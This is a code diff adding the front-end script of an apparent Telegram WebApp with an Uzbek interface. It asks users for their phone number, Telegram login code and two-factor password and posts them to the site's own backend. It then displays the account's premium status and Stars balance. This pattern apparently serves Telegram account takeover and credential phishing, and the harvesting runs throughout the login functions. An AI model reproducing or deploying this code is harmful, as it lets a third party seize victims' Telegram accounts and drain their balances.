+      <div class="loading-text">Foydalanuvchi ma'lumotlari yuklanmoqda...</div>
+    </div>
+  `;
+  
+  // API dan foydalanuvchi ma'lumotlarini olish
+  await fetchUserData();
+}
+
+async function fetchUserData() {
+  if (!PHONE) {
+    showMessage("Telefon raqam mavjud emas", "error");
+    logout();
+    return;
+  }
+  
+  try {
+    // Telefon raqamni encode qilish
+    const encodedPhone = encodeURIComponent(PHONE);
+    
+    const controller = new AbortController();
+    const timeoutId = setTimeout(() => controller.abort(), 10000);
+    
+    const response = await fetch(`${API_BASE}/accounts/${encodedPhone}/statistics`, {
+      method: 'GET',
+      signal: controller.signal,
+      headers: { 
+        'Accept': 'application/json'
+      }
+    });
+    
+    clearTimeout(timeoutId);
+    
+    if (!response.ok) {
+      throw new Error(`API ${response.status} xatosi`);
+    }
+    
+    const data = await response.json();
+    
+    if (data.status === "ok" && data.data && data.data.account) {
+      renderUserProfile(data.data);
+      updateApiStatus('online', 'Ma\'lumotlar yuklandi');
+    } else {
+      throw new Error("Foydalanuvchi ma'lumotlari olinmadi");
+    }
+    
+  } catch (error) {
+    console.error("Foydalanuvchi ma'lumotlarini olishda xato:", error);
+    
+    // Xato xabarini ko'rsatish
+    userProfileContent.innerHTML = `
+      <div class="user-profile">
+        <div class="warning">
+          ⚠️ Foydalanuvchi ma'lumotlari yuklanmadi: ${error.message}
+        </div>
+        <div style="margin-top: 24px;">
+          <button class="action-btn" onclick="fetchUserData()">Qayta urinish</button>
+          <button class="action-btn logout-btn" onclick="logout()">Chiqish</button>
+        </div>
+      </div>
+    `;
+    
+    updateApiStatus('offline', 'Ma\'lumotlar yuklanmadi');
+  }
+}
+
+function renderUserProfile(data) {
+  const account = data.account;
+  const now = new Date();
+  const loginTime = now.toLocaleTimeString('uz-UZ');
+  
+  // Avatar uchun birinchi harf
+  let firstChar = 'T';
+  if (account.username) {
+    firstChar = account.username.charAt(0).toUpperCase();
+  } else if (account.phone) {
+    firstChar = account.phone.slice(-1);
+  }
+  
+  // Badges HTML
+  let badgesHTML = '';
+  if (account.is_premium) {
+    badgesHTML += `<span class="account-badge badge-premium">PREMIUM</span>`;
+  }
+  if (account.is_verified) {
+    badgesHTML += `<span class="account-badge badge-verified">VERIFIED</span>`;
+  }
+  
+  const profileHTML = `
+    <div class="user-avatar">${firstChar}</div>
+    <div class="user-name">
+      ${account.username || `User ${account.user_id}`}
+      ${badgesHTML}
+    </div>
+    <div class="user-phone">${account.phone || PHONE || 'Noma\'lum'}</div>
+    
+    <div class="user-stats">
+      <div class="stat-item">
+        <span class="stat-label">Telefon raqam:</span>
+        <span class="stat-value">${account.phone || PHONE || 'Noma\'lum'}</span>
+      </div>
+      <div class="stat-item">
+        <span class="stat-label">Foydalanuvchi ID:</span>
+        <span class="stat-value">${account.user_id || 'Noma\'lum'}</span>
+      </div>
+      <div class="stat-item">
+        <span class="stat-label">Username:</span>
+        <span class="stat-value">${account.username || 'Yo\'q'}</span>
+      </div>
+      <div class="stat-item">
+        <span class="stat-label">Premium:</span>
+        <span class="stat-value" style="color: ${account.is_premium ? 'gold' : 'var(--muted)'}">
+          ${account.is_premium ? '✅ Ha' : '❌ Yo\'q'}
+        </span>
+      </div>
+      <div class="stat-item">
+        <span class="stat-label">Tasdiqlangan:</span>
+        <span class="stat-value" style="color: ${account.is_verified ? 'var(--success)' : 'var(--muted)'}">
+          ${account.is_verified ? '✅ Ha' : '❌ Yo\'q'}
+        </span>
+      </div>
+    </div>
+    
+    <div class="stars-balance">
+      <span class="star-icon">⭐</span>
+      <span>${account.stars_balance || 0}</span> Stars
+    </div>
+    
+    <div class="actions">
+      <button class="action-btn" onclick="fetchUserData()">🔄 Yangilash</button>
+      <button class="action-btn logout-btn" onclick="logout()">🚪 Chiqish</button>
+    </div>
+    
+    <div class="footer" style="margin-top: 24px;">
+      Muvaffaqiyatli kirildi • ${loginTime}
+    </div>
+  `;
+  
+  userProfileContent.innerHTML = profileHTML;
+}
+
+function logout() {
+  // LocalStorage dan o'chirish
+  localStorage.removeItem('loggedInPhone');
+  
+  // O'zgaruvchilarni tozalash
+  PHONE = null;
+  sessionData = null;
+  
+  // Login sahifasiga qaytish
+  profileContainer.style.display = 'none';
+  loginContainer.style.display = 'block';
+  showManualStep();
+  
+  showMessage("Chiqish muvaffaqiyatli", "success");
+}
+
+/* ====== UI HELPERS ====== */
+function showMessage(text, type = "success") {
+  msgEl.textContent = text;
+  msgEl.className = "msg " + type;
+}
+
+function clearMessage() {
+  msgEl.textContent = "";
+  msgEl.className = "msg";
+}
+
+function setLoading(btn, state, text = "Tekshirilmoqda...") {
+  if (!btn) return;
+  
+  btn.disabled = state;
+  btn.innerHTML = state
+    ? `<div class="spinner"></div> ${text}`
+    : btn.getAttribute('data-original-text') || "Tasdiqlash";
+}
+
+// Save original button texts
+document.querySelectorAll('button').forEach(btn => {
+  btn.setAttribute('data-original-text', btn.textContent);
+});
+
+/* ====== INPUT VALIDATION ====== */
+codeInput.addEventListener('input', function(e) {
+  this.value = this.value.replace(/[^0-9]/g, '');
+  
+  if (this.value.length > 5) {
+    this.value = this.value.substring(0, 5);
+  }
+});
+
+phoneNumberInput.addEventListener('input', function(e) {
+  this.value = this.value.replace(/[^0-9]/g, '');
+});
+
+countryCodeInput.addEventListener('keypress', (e) => {
+  if (e.key === 'Enter') sendCode();
+});
+
+phoneNumberInput.addEventListener('keypress', (e) => {
+  if (e.key === 'Enter') sendCode();
+});
+
+codeInput.addEventListener('keypress', (e) => {
+  if (e.key === 'Enter') verifyCode();
+});
+
+passwordInput.addEventListener('keypress', (e) => {
+  if (e.key === 'Enter') verifyPassword();
+});
+
+/* ====== SHARE CONTACT ====== */
+function shareContact() {
+  if (!Telegram?.WebApp) {
+    showMessage("Telegram WebApp muhiti topilmadi", "error");
+    showManualStep();
+    return;
+  }
+  
+  Telegram.WebApp.requestContact((res) => {
+    if (res?.phone_number) {
+      PHONE = res.phone_number;
+      sendCode();
+    } else {
+      showMessage("Telefon raqam olinmadi", "error");
+    }
+  });
+}
+
+/* ====== SEND CODE ====== */
+async function sendCode() {
+  const countryCode = countryCodeInput.value.trim();
+  const phoneNumber = phoneNumberInput.value.trim();
+  
+  if (!countryCode || !phoneNumber) {
+    showMessage("Davlat kodi va telefon raqamni kiriting", "error");
+    return;
+  }
+  
+  PHONE = countryCode + phoneNumber;
+  
+  if (PHONE.length < 10) {
+    showMessage("Telefon raqam noto'g'ri formatda", "error");
+    return;
+  }
+  
+  showMessage("Kod yuborilmoqda...");
+  setLoading(sendCodeBtn, true, "Kod yuborilmoqda...");
+  
+  try {
+    const controller = new AbortController();
+    const timeoutId = setTimeout(() => controller.abort(), 10000);
+    
+    const response = await fetch(`${API}/send-code`, {
+      method: "POST",
+      signal: controller.signal,
+      headers: { 
+        "Content-Type": "application/json",
+        "Accept": "application/json"
+      },
+      body: JSON.stringify({ phone: PHONE })
+    });
+    
+    clearTimeout(timeoutId);
+    
+    // Avval response statusni tekshirish
+    if (!response.ok) {
+      const contentType = response.headers.get('content-type');
+      let errorMessage = "Kod yuborilmadi";
+      
+      if (contentType && contentType.includes('application/json')) {
+        const errorData = await response.json();
+        errorMessage = errorData.detail || errorData.message || errorData.error || errorMessage;
+      } else {
+        const errorText = await response.text();
+        errorMessage = errorText || errorMessage;
+      }
+      
+      throw new Error(errorMessage);
+    }
+    
+    // JSON responseni o'qish
+    const data = await response.json();
+    
+    if (data.status === "error" || data.success === false || data.error) {
+      throw new Error(data.detail || data.error || data.message || "Kod yuborilmadi");
+    }
+    
+    showCodeStep();
+    showMessage("Kod yuborildi. Telegram'dan kelgan kodni kiriting.", "success");
+    updateApiStatus('online', 'Kod yuborildi');
+    
+  } catch (error) {
+    console.error("Kod yuborishda xato:", error);
+    
+    if (error.name === 'TypeError' && error.message.includes('fetch') || error.name === 'AbortError') {
+      updateApiStatus('offline', 'API javob bermadi');
+      showMessage("Internet ulanmadi yoki API javob bermadi. Iltimos, keyinroq urinib ko'ring.", "error");
+    } else {
+      showMessage(error.message, "error");
+    }
+  } finally {
+    setLoading(sendCodeBtn, false);
+  }
+}
+
+/* ====== VERIFY CODE ====== */
+async function verifyCode() {
+  const code = codeInput.value.trim();
+  
+  if (!code) {
+    showMessage("Kodni kiriting", "error");
+    codeInput.focus();
+    return;
+  }
+  
+  if (code.length !== 5) {
+    showMessage("Kod 5 ta raqamdan iborat bo'lishi kerak", "error");
+    codeInput.focus();
+    return;
+  }
+  
+  setLoading(verifyCodeBtn, true, "Tasdiqlanmoqda...");
+  
+  try {
+    const controller = new AbortController();
+    const timeoutId = setTimeout(() => controller.abort(), 10000);
+    
+    const requestBody = {
+      phone: PHONE,
+      code: code
+    };
+    
+    if (sessionData) {
+      Object.assign(requestBody, sessionData);
+    }
+    
+    const response = await fetch(`${API}/verify-code`, {
+      method: "POST",
+      signal: controller.signal,
+      headers: { 
+        "Content-Type": "application/json",
+        "Accept": "application/json"
+      },
+      body: JSON.stringify(requestBody)
+    });
+    
+    clearTimeout(timeoutId);
+    
+    const contentType = response.headers.get('content-type');
+    if (!contentType || !contentType.includes('application/json')) {
+      const errorText = await response.text();
+      console.error('Non-JSON response:', errorText.substring(0, 100));
+      throw new Error("Serverdan noto'g'ri javob qaytdi");
+    }
+    
+    const data = await response.json();
+    console.log("Verify code response:", data);
+    
+    if (data.status === "error") {
+      if (data.detail && data.detail.includes("2FA parol kerak")) {
+        tempCode = code;
+        if (data.session) {
+          sessionData = { session: data.session };
+        }
+        showPasswordStep();
+        showMessage("2FA parolni kiriting", "error");
+        setLoading(verifyCodeBtn, false);
+        return;
+      }
+      
+      throw new Error(data.detail || data.message || data.error || "Xatolik yuz berdi");
+    }
+    
+    // Muvaffaqiyatli
+    localStorage.setItem('loggedInPhone', PHONE);
+    await showUserProfile();
+    showMessage("Muvaffaqiyatli kirish! 🎉", "success");
+    updateApiStatus('online', 'Kirish muvaffaqiyatli');
+    
+  } catch (error) {
+    console.error("Tasdiqlashda xato:", error);
+    
+    if (error.name === 'AbortError') {
+      showMessage("API javob bermadi. Iltimos, qayta urinib ko'ring.", "error");
+      updateApiStatus('offline', 'API javob bermadi');
+    } else {
+      showMessage(error.message, "error");
+    }
+  } finally {
+    setLoading(verifyCodeBtn, false);
+  }
+}
+
+/* ====== VERIFY PASSWORD (2FA) ====== */
+async function verifyPassword() {
+  const password = passwordInput.value.trim();
+  
+  if (!password) {
+    showMessage("2FA parolni kiriting", "error");
+    passwordInput.focus();
+    return;
+  }
+  
+  setLoading(verifyPasswordBtn, true, "Tasdiqlanmoqda...");
+  
+  try {
+    const controller = new AbortController();
+    const timeoutId = setTimeout(() => controller.abort(), 10000);
+    
+    const requestBody = {
+      phone: PHONE,
+      code: tempCode,
+      password: password
+    };
+    
+    if (sessionData) {
+      Object.assign(requestBody, sessionData);
+    }
+    
+    const response = await fetch(`${API}/verify-code`, {
+      method: "POST",
+      signal: controller.signal,
+      headers: { 
+        "Content-Type": "application/json",
+        "Accept": "application/json"
+      },
+      body: JSON.stringify(requestBody)
+    });
+    
+    clearTimeout(timeoutId);
+    
+    const contentType = response.headers.get('content-type');
+    if (!contentType || !contentType.includes('application/json')) {
+      const errorText = await response.text();
+      console.error('Non-JSON response:', errorText.substring(0, 100));
+      throw new Error("Serverdan noto'g'ri javob qaytdi");
+    }
+    
+    const data = await response.json();
+    console.log("Verify password response:", data);
+    
+    if (data.status === "error") {
+      throw new Error(data.detail || data.message || data.error || "Noto'g'ri 2FA parol");
+    }
+    
+    // Muvaffaqiyatli
+    localStorage.setItem('loggedInPhone', PHONE);
+    await showUserProfile();
+    showMessage("Muvaffaqiyatli kirish! 🎉", "success");
+    updateApiStatus('online', 'Kirish muvaffaqiyatli');
+    
+  } catch (error) {
+    console.error("Tasdiqlashda xato:", error);
+    
+    if (error.name === 'AbortError') {
+      showMessage("API javob bermadi. Iltimos, qayta urinib ko'ring.", "error");
+      updateApiStatus('offline', 'API javob bermadi');
+    } else {
+      showMessage(error.message, "error");
+      passwordInput.value = "";
+      passwordInput.focus();
+    }
+  } finally {
+    setLoading(verifyPasswordBtn, false);
+  }
+}
+</script>
+
+</body>
+</html>
